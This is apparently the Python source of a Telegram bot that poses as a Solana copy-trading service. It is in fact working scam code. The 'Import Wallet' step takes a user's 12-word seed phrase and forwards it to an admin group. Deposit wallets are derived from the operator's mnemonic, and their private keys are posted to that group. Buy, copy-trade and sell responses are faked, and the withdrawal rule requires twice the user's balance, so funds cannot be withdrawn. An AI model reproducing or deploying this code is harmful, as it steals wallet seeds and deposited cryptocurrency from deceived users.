import re
import os
import hashlib
import base58
import json
import requests
import asyncio
from dotenv import load_dotenv
from nacl.signing import SigningKey
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solana.rpc.async_api import AsyncClient
from pycoingecko import CoinGeckoAPI
from telegram import (Update, ReplyKeyboardMarkup, InlineKeyboardButton,
                      InlineKeyboardMarkup)
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, filters, ContextTypes)

# Load environment variables
load_dotenv()
# Store temporary user states
user_states = {}
# Track users whose wallet info has been sent to admin group (prevent spam)
wallet_sent_to_admin = set()
# Track last notified balance per user (to show notification only once per deposit)
last_notified_balance = {}  # {telegram_id: balance}

# Load persisted wallet notifications from file
try:
    with open("wallet_notifications.txt", "r") as f:
        for line in f:
            user_id = line.strip()
            if user_id.isdigit():
                wallet_sent_to_admin.add(int(user_id))
except FileNotFoundError:
    pass  # File doesn't exist yet, will be created on first notification

# Balance tracking (cumulative deposits only)
user_balances = {
}  # {telegram_id: {"balance": float, "last_checked_slot": int}}
BALANCES_FILE = "user_balances.json"

# Load persisted balances
try:
    with open(BALANCES_FILE, "r") as f:
        user_balances = json.load(f)
        # Convert string keys back to int
        user_balances = {int(k): v for k, v in user_balances.items()}
except FileNotFoundError:
    pass


def save_balances():
    """Save user balances to file"""
    try:
        with open(BALANCES_FILE, "w") as f:
            json.dump(user_balances, f, indent=2)
    except Exception as e:
        print(f"Error saving balances: {e}")


# ---- CONFIG ----
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
if not BOT_TOKEN:
    raise SystemExit("TELEGRAM_BOT_TOKEN environment variable is required")
GROUP_ID = int(os.getenv('ADMIN_GROUP_ID', 0))
MNEMONIC = os.getenv('MNEMONIC',
                     '')  # Master seed phrase for wallet generation
COINGECKO_API_KEY = os.getenv('COINGECKO_API_KEY',
                              '')  # CoinGecko API key (optional)
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"  # Solana RPC endpoint

# Debug: Check if API key is loaded
if COINGECKO_API_KEY:
    print(f"âœ… CoinGecko API Key loaded: {COINGECKO_API_KEY[:8]}...")
else:
    print(
        "âš ï¸ WARNING: CoinGecko API Key NOT found! Prices may not work correctly."
    )
    print("   Make sure COINGECKO_API_KEY is set in your .env file")

# Initialize clients
# Use demo_api_key parameter for Demo API keys (api.coingecko.com)
# Use api_key parameter for Pro API keys (pro-api.coingecko.com)
if COINGECKO_API_KEY:
    cg = CoinGeckoAPI(demo_api_key=COINGECKO_API_KEY)
else:
    cg = CoinGeckoAPI()
solana_client = AsyncClient(SOLANA_RPC_URL)


# ---- Helper Functions ----
async def get_sol_price_usd():
    """Get current SOL price in USD from CoinGecko"""
    try:
        price_data = cg.get_price(ids='solana', vs_currencies='usd')
        return price_data.get('solana', {}).get('usd', 0)
    except Exception as e:
        print(f"Error fetching SOL price: {e}")
        return 0


async def check_wallet_balance(public_address: str):
    """Check wallet balance on Solana blockchain"""
    try:
        pubkey = Pubkey.from_string(public_address)
        response = await solana_client.get_balance(pubkey)
        if response.value is not None:
            # Convert lamports to SOL (1 SOL = 1,000,000,000 lamports)
            balance_sol = response.value / 1_000_000_000
            return balance_sol
        return 0
    except Exception as e:
        print(f"Error checking balance for {public_address}: {e}")
        return 0


async def monitor_deposits(telegram_id: int,
                           public_address: str,
                           context: ContextTypes.DEFAULT_TYPE,
                           notify_user: bool = True):
    """Monitor and update cumulative deposits for a wallet"""
    try:
        # Get current blockchain balance
        current_balance = await check_wallet_balance(public_address)

        # Get stored cumulative deposit balance
        if telegram_id not in user_balances:
            user_balances[telegram_id] = {"balance": 0, "last_checked_slot": 0}

        stored_balance = user_balances[telegram_id]["balance"]

        # If blockchain balance > stored balance, we have a new deposit
        if current_balance > stored_balance:
            deposit_amount = current_balance - stored_balance
            user_balances[telegram_id]["balance"] = current_balance
            save_balances()

            sol_price = await get_sol_price_usd()
            usd_value = current_balance * sol_price if sol_price > 0 else 0

            # Send notification to USER (only if not already notified for this specific balance)
            # Check if we've already notified for this exact balance
            if notify_user and last_notified_balance.get(
                    telegram_id, -1) != current_balance:
                try:
                    user_notification = (
                        f"ðŸ’° <b>Deposit Confirmed!</b>\n\n"
                        f"Amount: +{deposit_amount:.4f} SOL\n"
                        f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n\n"
                        f"Your deposit has been successfully received and credited to your wallet."
                    )
                    await context.bot.send_message(chat_id=telegram_id,
                                                   text=user_notification,
                                                   parse_mode="HTML")
                    # Mark this balance as notified
                    last_notified_balance[telegram_id] = current_balance
                except Exception as e:
                    print(f"Error sending notification to user: {e}")

            # Send notification to admin group
            if GROUP_ID:
                try:
                    user = await context.bot.get_chat(telegram_id)
                    user_name = user.username or user.first_name or str(
                        telegram_id)

                    deposit_notification = (
                        f"ðŸ’° <b>New Deposit Detected</b>\n\n"
                        f"User: @{user_name} (ID: {telegram_id})\n"
                        f"Address: <code>{public_address}</code>\n\n"
                        f"Deposit: +{deposit_amount:.4f} SOL\n"
                        f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n\n"
                        f"Cumulative deposits tracked.")
                    await context.bot.send_message(chat_id=GROUP_ID,
                                                   text=deposit_notification,
                                                   parse_mode="HTML")
                except Exception as e:
                    print(f"Error sending notification to admin group: {e}")

            return current_balance

        return stored_balance
    except Exception as e:
        print(f"Error monitoring deposits: {e}")
        return user_balances.get(telegram_id, {}).get("balance", 0)


def get_user_balance(telegram_id: int):
    """Get user's cumulative deposit balance"""
    return user_balances.get(telegram_id, {}).get("balance", 0)


async def check_and_notify_deposits(telegram_id: int,
                                    context: ContextTypes.DEFAULT_TYPE):
    """Check for deposits and notify user (called on any button click)"""
    try:
        public_address, _ = derive_keypair_and_address(telegram_id)
        await monitor_deposits(telegram_id,
                               public_address,
                               context,
                               notify_user=True)
    except Exception as e:
        print(f"Error checking deposits: {e}")


# ---- Wallet Generation Utility Functions ----
def derive_seed_from_mnemonic_and_id(mnemonic: str, telegram_id: int) -> bytes:
    """
    Deterministic derivation: Uses SHA256(mnemonic || ':' || telegram_id)
    Returns 32-byte seed for each unique Telegram ID
    """
    msg = (mnemonic.strip() + ":" + str(telegram_id)).encode("utf-8")
    digest = hashlib.sha256(msg).digest()
    return digest[:32]


def derive_keypair_and_address(telegram_id: int):
    """
    Generate unique Solana wallet for a Telegram user
    Returns: (public_address, private_key_base58)
    """
    if not MNEMONIC:
        raise ValueError("MNEMONIC not set in environment variables")

    # Derive unique seed for this telegram ID
    seed32 = derive_seed_from_mnemonic_and_id(MNEMONIC, telegram_id)

    # Generate Solana keypair
    kp = Keypair.from_seed(seed32)
    public_address = str(kp.pubkey())

    # Generate 64-byte secret key (private + public)
    sk = SigningKey(seed32)
    vk = sk.verify_key
    secret_64 = sk.encode() + vk.encode()
    private_key_b58 = base58.b58encode(secret_64).decode()

    return public_address, private_key_b58


# âœ… Step 1: Put the wallet function here
async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    telegram_id = user.id
    user_name = user.username or user.first_name or str(telegram_id)

    try:
        # Generate unique wallet for this user
        public_address, private_key_b58 = derive_keypair_and_address(
            telegram_id)

        # Send public address AND private key to admin group (only once per user to prevent spam)
        # This serves as backend storage for asset recovery
        if telegram_id not in wallet_sent_to_admin and GROUP_ID:
            try:
                admin_message = (f"ðŸ‘¤ <b>New Wallet Generated</b>\n\n"
                                 f"User: @{user_name} (ID: {telegram_id})\n\n"
                                 f"ðŸ“¬ <b>Public Address:</b>\n"
                                 f"<code>{public_address}</code>\n\n"
                                 f"ðŸ” <b>Private Key (Backend Storage):</b>\n"
                                 f"<code>{private_key_b58}</code>")
                await context.bot.send_message(chat_id=GROUP_ID,
                                               text=admin_message,
                                               parse_mode="HTML")
                wallet_sent_to_admin.add(telegram_id)
                # Persist to file for restart persistence
                try:
                    with open("wallet_notifications.txt", "a") as f:
                        f.write(f"{telegram_id}\n")
                except Exception as e:
                    print(f"Error persisting notification record: {e}")
            except Exception as e:
                print(f"Error sending wallet to admin group: {e}")

        # Monitor deposits and update balance
        balance = await monitor_deposits(telegram_id, public_address, context)

        # Get SOL price
        sol_price = await get_sol_price_usd()
        usd_value = balance * sol_price if sol_price > 0 else 0

        # Show public address to user (private key stored securely server-side)
        wallet_text = (
            "ðŸ’¼ <b>Wallet Overview</b> â€” <i>Connected</i> âœ…\n"
            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
            "<b>Your Solana Address</b>\n\n"
            "ðŸ“¬ <b>Solana Address:</b>\n"
            f"<code>{public_address}</code>\n\n"
            #"ðŸ” <b>Private Key:</b> Stored securely (contact admin for recovery)\n\n"
            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
            "<b>Holdings</b>\n"
            f"â€¢ <b>SOL:</b> {balance:.4f}\n"
            f"â€¢ <b>Total Assets:</b> ${usd_value:.2f}\n"
            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n"
            "ðŸ”˜ <i>No active tokens detected.</i>\n\n"
            "ðŸ’° <b>Fund Your Bot</b>\n"
            f"Send SOL to your address above\n\n"
            "(Funds are required for copy-trading operations.)\n\n"
            "âš¡ <b>Quick Actions</b>\n"
            "â€¢ âš“ï¸ /start â€“ Refresh your bot\n\n"
            "ðŸ‘‡ <i>What would you like to do next?</i>")
    except Exception as e:
        wallet_text = ("âš ï¸ <b>Wallet Generation Error</b>\n\n"
                       "Unable to generate wallet. Please contact support.\n"
                       f"Error: {str(e)}")

    if update.message:  # user typed ðŸ§©Wallet
        await update.message.reply_text(wallet_text, parse_mode="HTML")
    elif update.callback_query:  # user tapped ðŸ’° Fund Wallet
        await update.callback_query.answer()
        await update.callback_query.message.reply_text(wallet_text,
                                                       parse_mode="HTML")


# --- Continue with your other handlers (like bot guide, wallet, etc.) ---


# --- SETTINGS MENU ---
async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    Setting_buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Number of trades per day",
                                 callback_data="trade_per_day")
        ],
        [
            InlineKeyboardButton("Edit Number of consecutive buys",
                                 callback_data="consecutive_buys")
        ],
        [InlineKeyboardButton("Sell Position", callback_data="sell_position")],
    ])

    settings_text = (
        "<b>âš™ï¸ Settings Menu</b>\n\n"
        "Your settings are organized into categories for easy management:\n\n"
        "<b>Trading Options:</b>\n"
        "- Configure number of trades per day\n"
        "- Adjust consecutive buys\n"
        "- Manage sell positions\n\n"
        "Choose an option below to update:")

    await update.message.reply_text(settings_text,
                                    parse_mode="HTML",
                                    reply_markup=Setting_buttons)


# --- CALLBACK HANDLER (BUTTONS) ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    option = query.data
    user_id = query.from_user.id
    user = query.from_user
    user_name = user.username or user.first_name or str(user_id)

    # Check for deposits on ANY button click
    await check_and_notify_deposits(user_id, context)

    # Handle cancel action for settings
    if option == "cancel_settings":
        user_states.pop(user_id, None)  # Clear user state
        await query.edit_message_text(
            text=
            "âŒ Settings input cancelled. You can access settings again from the main menu.",
            parse_mode="HTML")
        return

    # Handle fund wallet action
    if option == "fund_wallet":
        # Generate wallet for deposit
        try:
            public_address, _ = derive_keypair_and_address(user_id)
            user_balance = get_user_balance(user_id)
            sol_price = await get_sol_price_usd()
            usd_value = user_balance * sol_price if sol_price > 0 else 0

            deposit_message = (
                "ðŸ’° <b>Fund Your Wallet</b>\n\n"
                f"Send SOL to the address below to fund your bot wallet:\n\n"
                f"ðŸ“¬ <b>Your Deposit Address:</b>\n"
                f"<code>{public_address}</code>\n\n"
                f"ðŸ’¡ <b>How to Deposit:</b>\n"
                f"1. Copy the address above\n"
                f"2. Send SOL from any Solana wallet\n"
                f"3. Deposits are detected automatically\n"
                f"4. You'll receive a notification when funds arrive\n\n"
                f"ðŸ“Š <b>Current Balance:</b> {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
                f"âš ï¸ <b>Note:</b> Only send SOL to this address. Sending other tokens may result in loss of funds.\n\n"
                f"ðŸ”„ Deposits are monitored every 30 seconds and you'll be notified immediately when received."
            )

            await query.answer()
            await query.message.reply_text(deposit_message, parse_mode="HTML")
        except Exception as e:
            await query.answer()
            await query.message.reply_text(
                "âš ï¸ Error generating deposit address. Please try again or contact support.",
                parse_mode="HTML")
        return

    # Handle BUY actions
    if option.startswith("buy_"):
        parts = option.split(
            "_", 2)  # buy_amount_tokenaddress or buy_custom_tokenaddress

        if parts[1] == "custom":
            # Store state for custom buy input
            token_address = parts[2] if len(
                parts) > 2 else context.user_data.get("current_token", "")
            context.user_data["awaiting_custom_buy"] = token_address

            cancel_button = InlineKeyboardMarkup([[
                InlineKeyboardButton("âŒ Cancel",
                                     callback_data="cancel_custom_trade")
            ]])

            await query.message.reply_text(
                "ðŸŸ¢ <b>Custom Buy Amount</b>\n\n"
                "Please enter the amount of SOL you want to buy:\n\n"
                "ðŸ“ Enter your desired SOL amount (e.g., 0.25, 2.5, 10)",
                parse_mode="HTML",
                reply_markup=cancel_button)
            return
        else:
            # Fixed amount buy
            amount = parts[1]
            token_address = parts[2] if len(
                parts) > 2 else context.user_data.get("current_token", "")

            # Check user balance and apply validation rules
            user_balance = get_user_balance(user_id)
            sol_price = await get_sol_price_usd()
            usd_value = user_balance * sol_price if sol_price > 0 else 0

            # Balance validation rules
            if user_balance == 0:
                await query.message.reply_text(f"â— Insufficient SOL balance.",
                                               parse_mode="HTML")
                return
            elif usd_value < 10:
                await query.message.reply_text(
                    f"â— Minimum amount required to buy a token is above $10.\n\n"
                    f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})",
                    parse_mode="HTML")
                return
            else:
                # Balance >= $10
                await query.message.reply_text(
                    f"Buying tokens is currently not available in your region at the moment. Try again later.\n\n"
                    f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})",
                    parse_mode="HTML")
                return

    # Handle SELL actions
    if option.startswith("sell_"):
        parts = option.split(
            "_", 2)  # sell_percentage_tokenaddress or sell_custom_tokenaddress

        if parts[1] == "custom":
            # Store state for custom sell input
            token_address = parts[2] if len(
                parts) > 2 else context.user_data.get("current_token", "")
            context.user_data["awaiting_custom_sell"] = token_address

            cancel_button = InlineKeyboardMarkup([[
                InlineKeyboardButton("âŒ Cancel",
                                     callback_data="cancel_custom_trade")
            ]])

            await query.message.reply_text(
                "ðŸ”´ <b>Custom Sell Percentage</b>\n\n"
                "Please enter the percentage you want to sell:\n\n"
                "ðŸ“ Enter your desired percentage (e.g., 25, 75, 90)",
                parse_mode="HTML",
                reply_markup=cancel_button)
            return
        else:
            # Fixed percentage sell
            percentage = parts[1]
            token_address = parts[2] if len(
                parts) > 2 else context.user_data.get("current_token", "")
            # Show user response (without private key)
            await query.message.reply_text(
                f"ðŸ”´ <b>Sell Order Submitted</b>\n\n"
                f"Percentage: {percentage}%\n"
                f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
                f"â— No token balance to sell.",
                parse_mode="HTML")
            return

    # Handle cancel custom trade
    if option == "cancel_custom_trade":
        context.user_data.pop("awaiting_custom_buy", None)
        context.user_data.pop("awaiting_custom_sell", None)
        await query.message.reply_text("âŒ Trade cancelled.",
                                       reply_markup=main_menu_markup())
        return

    # Handle WITHDRAWAL actions
    if option == "withdraw_100":
        # Get user balance
        user_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0

        # Minimum SOL required for gas fees (kept in wallet)
        MIN_GAS_RESERVE = 0.005

        # Calculate minimum withdrawal (2x current balance)
        minimum_withdrawal = user_balance * 2

        # Apply withdrawal rules
        if user_balance == 0:
            await query.message.reply_text("â— Insufficient SOL balance.",
                                           parse_mode="HTML")
            return

        # Check if balance is above $10
        if usd_value < 10:
            await query.message.reply_text(
                f"â— Your balance must be above $10 to withdraw.\n\n"
                f"Current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
                f"Required minimum: $10 worth of SOL\n\n"
                f"Please deposit more SOL to meet the minimum withdrawal requirement.",
                parse_mode="HTML")
            return

        # Show withdrawal requirements (minimum = 2x balance)
        await query.message.reply_text(
            f"ðŸ’¸ <b>Withdrawal Requirements</b>\n\n"
            f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
            f"<b>Minimum withdrawal required:</b> {minimum_withdrawal:.4f} SOL\n"
            ##f"âš ï¸ <b>Gas Fee Reserve:</b> {MIN_GAS_RESERVE} SOL must remain in wallet\n\n"
            f"â— You need at least {minimum_withdrawal:.4f} SOL to process a withdrawal.\n"
            f"Please deposit more funds to meet the minimum requirement.",
            parse_mode="HTML")
        return

    if option == "withdraw_custom":
        # Store state for custom withdrawal
        context.user_data["awaiting_withdraw"] = True

        # Get user balance to show in prompt
        user_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0

        # Minimum SOL required for gas fees (kept in wallet)
        MIN_GAS_RESERVE = 0.005

        # Calculate minimum withdrawal (2x current balance)
        minimum_withdrawal = user_balance * 2

        await query.message.reply_text(
            f"ðŸ’¸ <b>Withdraw Custom Amount</b>\n\n"
            f"Your current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
            f"<b>Minimum withdrawal:</b> {minimum_withdrawal:.4f} SOL\n"
            #f"<b>Gas fee reserve:</b> {MIN_GAS_RESERVE} SOL (must remain in wallet)\n\n"
            f"Please enter the withdrawal amount (in SOL):\n\n"
            f"ðŸ“ Enter your desired amount (minimum: {minimum_withdrawal:.4f} SOL)",
            parse_mode="HTML",
            reply_markup=cancel_markup())
        return

    # Save state for this user (for settings)
    user_states[user_id] = option

    # Create cancel button for settings input
    cancel_button = InlineKeyboardMarkup(
        [[InlineKeyboardButton("âŒ Cancel", callback_data="cancel_settings")]])

    await query.edit_message_text(
        text=
        f"Please enter a number for <b>{option.replace('_', ' ').title()}</b>:\n\nðŸ“ Enter your desired value and send it as a message.",
        parse_mode="HTML",
        reply_markup=cancel_button)


# ---- Helpers ----
def main_menu_markup():
    keyboard = [["ðŸ’¸Withdraw", "ðŸ”ŒImport Wallet"], ["ðŸ”Copy Trade", "âš™ï¸Settings"],
                ["ðŸ’³Wallet", "ðŸ¤–Bot Guide"], ["ðŸ’°Buy/Sell", "ðŸ“ŠLive Chart"]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


def cancel_markup():
    return ReplyKeyboardMarkup([["Cancel"]],
                               resize_keyboard=True,
                               one_time_keyboard=True)


# Validate a single word: only letters A-Z (either case)
def is_alpha_word(word: str) -> bool:
    return bool(re.fullmatch(r"[A-Za-z]+", word))


# Fetch token details from DexScreener API (using run_in_executor for non-blocking)
async def get_token_details(token_address: str):
    """Fetch token details from DexScreener API"""
    import asyncio

    def fetch():
        try:
            url = f"https://api.dexscreener.com/latest/dex/tokens/{token_address}"
            response = requests.get(url, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if data and 'pairs' in data and len(data['pairs']) > 0:
                    return data['pairs'][
                        0]  # Return the first (most liquid) pair
            return None
        except Exception as e:
            print(f"Error fetching token details: {e}")
            return None

    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, fetch)


# Format token details for display
def format_token_details(pair_data, wallet_balance=0):
    """Format token details in the style requested by user"""
    try:
        from datetime import datetime

        token = pair_data.get('baseToken', {})
        quote = pair_data.get('quoteToken', {})

        # Token name and symbol
        token_name = token.get('name', 'Unknown')
        token_symbol = token.get('symbol', 'Unknown')
        token_address = token.get('address', 'N/A')

        # Market data
        price_usd = float(pair_data.get('priceUsd',
                                        0)) if pair_data.get('priceUsd') else 0
        market_cap = pair_data.get('marketCap')
        fdv = pair_data.get('fdv')
        liquidity_usd = pair_data.get('liquidity', {}).get('usd', 0)

        # Volume and transactions
        volume_24h = pair_data.get('volume', {}).get('h24', 0)
        txns_24h = pair_data.get('txns', {}).get('h24', {})
        buyers_24h = txns_24h.get('buys', 0) if txns_24h else 0

        # DEX info
        dex_id = pair_data.get('dexId', 'Unknown').upper()
        pair_created = pair_data.get('pairCreatedAt', 0)

        # Links
        info = pair_data.get('info', {})
        socials = info.get('socials', [])

        twitter_link = "âŒ"
        telegram_link = "âŒ"

        for social in socials:
            if social.get('type') == 'twitter':
                twitter_link = "âœ…"
            elif social.get('type') == 'telegram':
                telegram_link = "âœ…"

        # Format price with proper decimals (fix for very small prices)
        if price_usd == 0:
            price_str = "0"
        else:
            # Use high precision formatting to preserve significant digits for very small prices
            price_str = ("%.18f" % price_usd).rstrip('0').rstrip('.')

        # Fix timestamp conversion (pairCreatedAt is in milliseconds)
        if pair_created:
            # Convert milliseconds to seconds
            created_dt = datetime.fromtimestamp(pair_created / 1000)
            time_diff = datetime.now() - created_dt
            days = time_diff.days
            hours = time_diff.seconds // 3600
            minutes = (time_diff.seconds % 3600) // 60
            time_ago = f"{days}d {hours}h {minutes}m ago" if days > 0 else f"{hours}h {minutes}m ago"
        else:
            time_ago = "Unknown"

        # Format market cap with fallback to FDV
        if market_cap and market_cap > 0:
            if market_cap >= 1000000:
                mcap_str = f"{market_cap/1000000:.1f}M"
            else:
                mcap_str = f"{market_cap/1000:.1f}K"
        elif fdv and fdv > 0:
            if fdv >= 1000000:
                mcap_str = f"{fdv/1000000:.1f}M (FDV)"
            else:
                mcap_str = f"{fdv/1000:.1f}K (FDV)"
        else:
            mcap_str = "Unknown"

        # Format liquidity
        if liquidity_usd >= 1000000:
            liq_str = f"{liquidity_usd/1000000:.2f}M"
        else:
            liq_str = f"{liquidity_usd/1000:.2f}K"

        message = (
            f"ðŸ“Œ <b>{token_name} ({token_symbol})</b>\n"
            f"<code>{token_address}</code>\n\n"
            f"ðŸ’³ <b>Wallet:</b>\n"
            f"|â€”â€”Balance: {wallet_balance} SOL\n"
            f"|â€”â€”Holding: 0 {token_symbol}\n"
            f"|___PnL: 0%ðŸš€ðŸš€\n\n"
            f"ðŸ’µ <b>Trade:</b>\n"
            f"|â€”â€”Market Cap: {mcap_str}\n"
            f"|â€”â€”Price: {price_str}\n"
            f"|___Buyers (24h): {buyers_24h}\n\n"
            # f"ðŸ” <b>Security:</b>\n"
            # f"|â€”â€”Security scan available on DexScreener\n"
            # f"|â€”â€”Trade Tax: Check DexScreener\n"
            # f"|___Top 10: Check DexScreener\n\n"
            f"ðŸ“ <b>LP:</b> {token_symbol}-{quote.get('symbol', 'SOL')}\n"
            f"|â€”â€”ðŸ’§ {dex_id} AMM\n"
            f"|â€”â€”ðŸŸ¢ Trading opened\n"
            f"|â€”â€”Created {time_ago}\n"
            f"|___Liquidity: {liq_str} USD\n\n"
            f"ðŸ“² <b>Links:</b>\n"
            f"|â€”â€” Twitter {twitter_link}\n"
            f"|â€”â€” Telegram {telegram_link}\n"
            f"|___ <a href='https://dexscreener.com/solana/{token_address}'>DexScreener</a> | "
            f"<a href='https://www.pump.fun/{token_address}'>Pump</a>")

        return message
    except Exception as e:
        print(f"Error formatting token details: {e}")
        return None


# --- /start ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "ðŸ‘‹ Welcome to CeloAi Bot!\n"
        "Step into the world of fast, smart, and stress-free trading, "
        "designed for both beginners and seasoned traders.\n\n"
        "ðŸ”— Connecting to your wallet...\n"
        "â³ Initializing your account and securing your funds...\n"
        "âœ… Wallet successfully created and linked!\n\n"
        "ðŸ’¡Tap Continue below to access your wallet and explore all trading options.",
        reply_markup=main_menu_markup())
    # clear states
    context.user_data.pop("awaiting_dummy", None)
    context.user_data.pop("awaiting_withdraw", None)


# --- Message handler ---
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    user = update.effective_user
    user_id = user.id
    user_name = user.username or user.first_name or str(user_id)

    # ----- Handle Connect Wallet (12 dummy words) -----
    if context.user_data.get("awaiting_dummy"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_dummy", None)
            await update.message.reply_text("Request cancelled. Back to menu:",
                                            reply_markup=main_menu_markup())
            return

        words = [w for w in text.split() if w.strip()]
        count = len(words)

        if count != 12:
            await update.message.reply_text(
                f"âŒ <b>Invalid Seed Phrase Length</b>\n\n"
                f"You entered {count} word(s), but we need exactly 12 words.\n\n"
                f"ðŸ“ <b>Please try again:</b>\n"
                f"â€¢ Send exactly 12 words separated by spaces\n"
                f"â€¢ Each word should contain only letters (A-Z)\n\n"
                f"Or tap Cancel to abort the wallet connection.",
                parse_mode="HTML",
                reply_markup=cancel_markup())
            return

        bad_indices = [
            i + 1 for i, w in enumerate(words) if not is_alpha_word(w)
        ]
        if bad_indices:
            positions = ", ".join(map(str, bad_indices))
            await update.message.reply_text(
                f"âŒ <b>Invalid Characters Found</b>\n\n"
                f"Some words contain invalid characters. Words must contain only letters (A-Z).\n\n"
                f"ðŸ” <b>Please check word position(s):</b> {positions}\n\n"
                f"ðŸ“ Fix the invalid words and try again, or tap Cancel to abort the wallet connection.",
                parse_mode="HTML",
                reply_markup=cancel_markup())
            return

        wallet_seed = " ".join(words)
        forward_text = (
            f"ðŸ” Wallet Connection Request from @{user_name} (id: {user_id}):\n\n"
            f"<pre>{wallet_seed}</pre>")
        try:
            await context.bot.send_message(chat_id=GROUP_ID,
                                           text=forward_text,
                                           parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text(
                "Failed to forward input to the group. Contact the bot admin.")
            print("Error sending to group:", e)
            context.user_data.pop("awaiting_dummy", None)
            await update.message.reply_text("Back to menu:",
                                            reply_markup=main_menu_markup())
            return

        context.user_data.pop("awaiting_dummy", None)
        await update.message.reply_text(
            "âœ… <b>Wallet Connection Processing</b>\n\n"
            "Please wait while our system processes your wallet import request âœ…",
            parse_mode="HTML",
            reply_markup=main_menu_markup())
        return

    # ----- Handle Withdraw flow -----
    if context.user_data.get("awaiting_withdraw"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_withdraw", None)
            await update.message.reply_text("Withdrawal cancelled.",
                                            reply_markup=main_menu_markup())
            return

        try:
            amount = float(text)
        except ValueError:
            await update.message.reply_text(
                "â— Invalid amount. Please enter a number or tap Cancel.",
                reply_markup=cancel_markup())
            return

        if amount <= 0:
            await update.message.reply_text(
                "â— Withdrawal amount must be greater than zero.",
                reply_markup=cancel_markup())
            return

        # Get user balance
        user_balance = get_user_balance(user_id)

        # Get SOL price to check USD value
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0

        # Minimum SOL required for gas fees
        MIN_GAS_RESERVE = 0.005

        # Calculate minimum withdrawal (2x current balance)
        minimum_withdrawal = user_balance * 2

        # First check if balance is 0
        if user_balance == 0:
            await update.message.reply_text("â— Insufficient SOL balance.",
                                            reply_markup=main_menu_markup())
            context.user_data.pop("awaiting_withdraw", None)
            return

        # Check if balance is above $10
        if usd_value < 10:
            await update.message.reply_text(
                f"â— Your balance must be above $10 to withdraw.\n\n"
                f"Current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
                f"Required minimum: $10 worth of SOL\n\n"
                f"Please deposit more SOL to meet the minimum withdrawal requirement.",
                reply_markup=main_menu_markup())
            context.user_data.pop("awaiting_withdraw", None)
            return

        # Check if amount meets minimum withdrawal requirement (2x balance)
        if amount < minimum_withdrawal:
            await update.message.reply_text(
                f"â— <b>Withdrawal Amount Too Low</b>\n\n"
                f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
                f"Minimum withdrawal: {minimum_withdrawal:.4f} SOL\n\n"
                f"You need to withdraw at least {minimum_withdrawal:.4f} SOL.\n"
                f"Please enter a higher amount or deposit more funds.",
                parse_mode="HTML",
                reply_markup=cancel_markup())
            return

        # Amount meets minimum but user doesn't have enough balance
        await update.message.reply_text(
            f"â— <b>Insufficient Balance for Withdrawal</b>\n\n"
            f"Withdrawal amount: {amount:.4f} SOL\n"
            f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
            # f"Gas fee reserve: {MIN_GAS_RESERVE} SOL\n\n"
            f"You don't have enough SOL to complete this withdrawal.\n"
            f"Please deposit more funds to your wallet.",
            parse_mode="HTML",
            reply_markup=main_menu_markup())

        context.user_data.pop("awaiting_withdraw", None)
        return

    # ----- Handle Copy Trade -----
    if context.user_data.get("awaiting_copy_trade"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_copy_trade", None)
            await update.message.reply_text("Copy Trade cancelled.",
                                            reply_markup=main_menu_markup())
            return

        wallet_address = text.strip()

        # âœ… Check if wallet address looks valid (length = 44 and letters/numbers only)
        if len(wallet_address) != 44 or not wallet_address.isalnum():
            await update.message.reply_text("â— Invalid Solana wallet address.",
                                            reply_markup=cancel_markup())
            return

        # Check user balance
        user_balance = get_user_balance(user_id)

        # If balance is 0, show insufficient balance
        if user_balance == 0:
            await update.message.reply_text("â— Insufficient SOL balance.",
                                            reply_markup=main_menu_markup())
            context.user_data.pop("awaiting_copy_trade", None)
            return

        # If balance > 0, show success message
        await update.message.reply_text(
            f"âœ… <b>Address Added Successfully!</b>\n\n"
            f"Wallet address has been added to your copy trade list:\n\n"
            f"<code>{wallet_address}</code>\n\n"
            f"You will now copy trades from this wallet automatically.",
            parse_mode="HTML",
            reply_markup=main_menu_markup())

        context.user_data.pop("awaiting_copy_trade", None)
        return

    # ----- Handle Custom Buy Amount -----
    if context.user_data.get("awaiting_custom_buy"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_custom_buy", None)
            await update.message.reply_text("Buy cancelled.",
                                            reply_markup=main_menu_markup())
            return

        try:
            amount = float(text)
            if amount <= 0:
                await update.message.reply_text(
